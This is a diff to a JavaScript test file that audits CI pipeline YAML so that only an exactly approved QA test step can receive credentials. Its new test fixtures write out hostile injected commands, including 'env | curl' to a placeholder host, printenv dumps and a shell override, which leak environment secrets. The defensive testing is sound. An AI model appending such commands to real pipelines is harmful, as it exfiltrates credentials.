@@ -88,23 +88,52 @@ const stepRange = (lines, at) => {
   return [start, end];
 };
 
+// The one step that may carry credentials is constrained, not just scanned: exactly the keys `run`/`script` and `env` (plus an optional
+// display name), a `run`/`script` value equal to the approved command below, and an `env` of only `CI: 'true'` and this environment's own
+// mappings. A changed qa test command must be changed here on purpose; anything else (a second command, `shell`, `working-directory`,
+// `continue-on-error`, an extra env entry) makes the step unapproved, and then no credential line is allowed anywhere.
+const APPROVED_GITHUB_COMMANDS = {
+  staging: 'node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"',
+  production: 'node qa-authority/qa/bin/qa.mjs test --tier production-sanity --env production --base-url "$PROD_URL"',
+};
+const APPROVED_AZURE_COMMANDS = {
+  STAGING: 'node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"',
+  PROD: 'node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier production-sanity --env production --base-url "$(PROD_URL)"',
+};
+const GITHUB_STEP = { commandKey: 'run', optional: ['name'], commands: APPROVED_GITHUB_COMMANDS };
+const AZURE_STEP = { commandKey: 'script', optional: ['displayName'], commands: APPROVED_AZURE_COMMANDS };
+
 // Line numbers (0-based, within `source`) of the credential mappings that are allowed: the own-name mapping lines in the env block of the
-// single step that runs `qa.mjs test`.
-function allowedStepLines(source, ownNames, mapping) {
+// single, exactly approved step that runs `qa.mjs test`.
+function allowedStepLines(source, ownNames, mapping, shape, approved) {
   const lines = source.split('\n');
   const testLines = lines.map((line, index) => (/qa\.mjs\s+test\b/.test(line) && !line.trim().startsWith('#') ? index : -1)).filter(index => index >= 0);
+  if (testLines.length !== 1) return new Set();
+  const [start, end] = stepRange(lines, testLines[0]);
+  const keyIndent = indentOf(lines[start]) + 2;
   const allowed = new Set();
-  if (testLines.length === 1) {
-    const [start, end] = stepRange(lines, testLines[0]);
-    for (let i = start; i < end; i += 1) {
-      const hit = [...ownNames].find(name => mapping(name).test(lines[i]));
-      if (!hit) continue;
-      let up = i - 1;
-      while (up >= start && indentOf(lines[up]) >= indentOf(lines[i])) up -= 1;
-      if (up >= start && /^\s*env:\s*$/.test(lines[up])) allowed.add(i);
+  const seen = new Set();
+  let envIndent = null;
+  for (let i = start; i < end; i += 1) {
+    const text = i === start ? lines[i].replace(/^(\s*)- /, '$1  ') : lines[i];
+    if (!text.trim() || text.trim().startsWith('#')) continue;
+    const indent = indentOf(text);
+    if (envIndent !== null && indent > envIndent) {
+      if (indent <= keyIndent) return new Set();
+      if (/^\s+CI:\s*'true'\s*$/.test(text)) continue;
+      if ([...ownNames].some(name => mapping(name).test(text))) { allowed.add(i); continue; }
+      return new Set();
     }
+    envIndent = null;
+    if (indent !== keyIndent) return new Set();
+    const [, key, value] = text.trim().match(/^([\w-]+):\s*(.*)$/) ?? [];
+    if (!key || seen.has(key)) return new Set();
+    seen.add(key);
+    if (key === shape.commandKey) { if (value.trim() !== approved || /^[|>]/.test(value.trim())) return new Set(); }
+    else if (key === 'env') { if (value.trim() !== '') return new Set(); envIndent = keyIndent; }
+    else if (!shape.optional.includes(key)) return new Set();
   }
-  return allowed;
+  return seen.has(shape.commandKey) && seen.has('env') ? allowed : new Set();
 }
 
 // Every credential name in the text that is not one of the allowed lines is a violation.
@@ -119,8 +148,8 @@ function stray(label, lines, allowed) {
   return violations;
 }
 
-function credentialStepViolations(label, source, ownNames, mapping) {
-  return [...new Set(stray(label, source.split('\n'), allowedStepLines(source, ownNames, mapping)))];
+function credentialStepViolations(label, source, ownNames, mapping, shape, approved) {
+  return [...new Set(stray(label, source.split('\n'), allowedStepLines(source, ownNames, mapping, shape, approved)))];
 }
 
 const lineOffset = (source, part) => { const at = source.indexOf(part.trimEnd()); assert.notEqual(at, -1, 'part of the file'); return source.slice(0, at).split('\n').length - 1; };
@@ -150,7 +179,7 @@ function auditGithub(source) {
   for (const job of jobs) {
     if (!githubCredentialJobAllowed(jobs, job)) continue;
     const base = lineOffset(source, job.source);
-    for (const index of allowedStepLines(job.source, credentialsOf(GITHUB_RELEASE_JOBS[job.name].config), githubMapping)) allowedLines.add(base + index);
+    for (const index of allowedStepLines(job.source, credentialsOf(GITHUB_RELEASE_JOBS[job.name].config), githubMapping, GITHUB_STEP, APPROVED_GITHUB_COMMANDS[job.name])) allowedLines.add(base + index);
   }
   violations.push(...stray('github', source.split('\n'), allowedLines));
   const rootLines = top.split('\n');
@@ -165,7 +194,7 @@ function auditGithub(source) {
     const own = GITHUB_RELEASE_JOBS[job.name] ? credentialsOf(GITHUB_RELEASE_JOBS[job.name].config) : new Set();
     const eligible = githubCredentialJobAllowed(jobs, job);
     let scanned = job.source;
-    if (eligible) violations.push(...credentialStepViolations(`github:${job.name}`, job.source, own, githubMapping));
+    if (eligible) violations.push(...credentialStepViolations(`github:${job.name}`, job.source, own, githubMapping, GITHUB_STEP, APPROVED_GITHUB_COMMANDS[job.name]));
     for (const [, name] of job.source.matchAll(/\$\{\{\s*secrets\.(\w+)\s*\}\}/g)) {
       if (!credentialNames.has(name)) continue;
       if (eligible && own.has(name)) scanned = scanned.replace(new RegExp(`\\$\\{\\{\\s*secrets\\.${name}\\s*\\}\\}`, 'g'), '');
@@ -226,7 +255,7 @@ function auditAzureCredentials(source) {
   for (const stage of stages) {
     if (!azureCredentialStageAllowed(stages, stage)) continue;
     const base = lineOffset(source, stage.source);
-    for (const index of allowedStepLines(stage.source, credentialsOf(AZURE_RELEASE_STAGES[stage.name].config), azureMapping)) allowedLines.add(base + index);
+    for (const index of allowedStepLines(stage.source, credentialsOf(AZURE_RELEASE_STAGES[stage.name].config), azureMapping, AZURE_STEP, APPROVED_AZURE_COMMANDS[stage.name])) allowedLines.add(base + index);
   }
   violations.push(...stray('azure', source.split('\n'), allowedLines));
   source.split('\n').forEach((line, index) => {
@@ -238,7 +267,7 @@ function auditAzureCredentials(source) {
   for (const stage of stages) {
     const own = AZURE_RELEASE_STAGES[stage.name] ? credentialsOf(AZURE_RELEASE_STAGES[stage.name].config) : new Set();
     const allowed = azureCredentialStageAllowed(stages, stage);
-    if (allowed) violations.push(...credentialStepViolations(`azure:${stage.name}`, stage.source, own, azureMapping));
+    if (allowed) violations.push(...credentialStepViolations(`azure:${stage.name}`, stage.source, own, azureMapping, AZURE_STEP, APPROVED_AZURE_COMMANDS[stage.name]));
     for (const name of credentialNames) {
       if (allowed && own.has(name)) continue;
       if (!new RegExp(`\\b${name}\\b`).test(stage.source)) continue;
@@ -349,6 +378,46 @@ test('GitHub audit rejects a second step in the release job that can send a cred
   };
   for (const [name, yaml] of Object.entries(fixtures)) {
     assert.ok(auditGithub(yaml).length > 0, `rejected: ${name}`);
+  }
+});
+
+test('GitHub audit rejects any change to the approved qa test step', () => {
+  const mutate = (from, to) => { assert.ok(githubYaml.includes(from), from); return githubYaml.replace(from, to); };
+  const run = '      - run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n';
+  const fixtures = {
+    'a command appended with && env | curl': mutate('--base-url "$STAGING_URL"\n', '--base-url "$STAGING_URL" && env | curl -d @- https://example.invalid\n'),
+    'a command appended with ; printenv': mutate('--base-url "$STAGING_URL"\n', '--base-url "$STAGING_URL"; printenv > out.txt\n'),
+    'a multi-line run with the approved command and another line': mutate(run, '      - run: |\n          node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n          printenv > out.txt\n'),
+    'a shell override': mutate(run, '      - shell: bash -c "env > out.txt; $0"\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
+    'a working-directory in PR-controlled code': mutate(run, '      - working-directory: app\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
+    'an extra env entry': mutate("          CI: 'true'\n          QA_STAGING_USER", "          CI: 'true'\n          EXTRA: x\n          QA_STAGING_USER"),
+    'continue-on-error': mutate(run, '      - continue-on-error: true\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
+    'an if on the step': mutate(run, '      - if: always()\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
+    'a changed tier': mutate('--tier release-smoke --env staging', '--tier everything --env staging'),
+    'a uses key beside run': mutate(run, '      - uses: example/x@v1\n        run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n'),
+  };
+  assert.deepEqual(auditGithub(githubYaml), []);
+  for (const [name, yaml] of Object.entries(fixtures)) {
+    assert.ok(auditGithub(yaml).length > 0, `rejected: ${name}`);
+  }
+});
+
+test('Azure audit rejects any change to the approved qa test step', () => {
+  const mutate = (from, to) => { assert.ok(azureYaml.includes(from), from); return azureYaml.replace(from, to); };
+  const script = '          - script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n';
+  const fixtures = {
+    'a command appended with && env | curl': mutate('--base-url "$(STAGING_URL)"\n', '--base-url "$(STAGING_URL)" && env | curl -d @- https://example.invalid\n'),
+    'a command appended with ; printenv': mutate('--base-url "$(STAGING_URL)"\n', '--base-url "$(STAGING_URL)"; printenv > out.txt\n'),
+    'a multi-line script with the approved command and another line': mutate(script, '          - script: |\n              node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n              printenv > out.txt\n'),
+    'a working directory in PR-controlled code': mutate(script, '          - workingDirectory: app\n            script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n'),
+    'an extra env entry': mutate("              CI: 'true'\n              QA_STAGING_USER", "              CI: 'true'\n              EXTRA: x\n              QA_STAGING_USER"),
+    'continueOnError': mutate(script, '          - continueOnError: true\n            script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n'),
+    'a condition on the step': mutate(script, '          - condition: always()\n            script: node qaAuthority/qa/bin/qa.mjs test --config qaAuthority/qa/qa.config.json --tier release-smoke --env staging --base-url "$(STAGING_URL)"\n'),
+    'a changed tier': mutate('--tier release-smoke --env staging', '--tier everything --env staging'),
+  };
+  assert.deepEqual(auditAzure(azureYaml), []);
+  for (const [name, yaml] of Object.entries(fixtures)) {
+    assert.ok(auditAzure(yaml).length > 0, `rejected: ${name}`);
   }
 });
 
